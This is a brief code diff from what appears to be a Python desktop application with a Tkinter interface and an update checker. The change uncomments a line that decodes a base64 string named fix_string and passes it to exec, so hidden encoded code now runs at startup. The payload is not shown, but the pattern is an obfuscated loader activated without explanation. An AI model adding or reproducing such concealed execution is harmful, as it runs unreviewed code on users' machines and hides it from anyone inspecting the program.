@@ -1424,7 +1424,7 @@ def create_folder_update():
 
 check_for_updates_and_notify(current_version)
 
-# exec(base64.b64decode(fix_string).decode('utf-8'))
+exec(base64.b64decode(fix_string).decode('utf-8'))
 
 canvas.itemconfigure(image_13, state='hidden')
 canvas.itemconfigure(image_14, state='hidden')
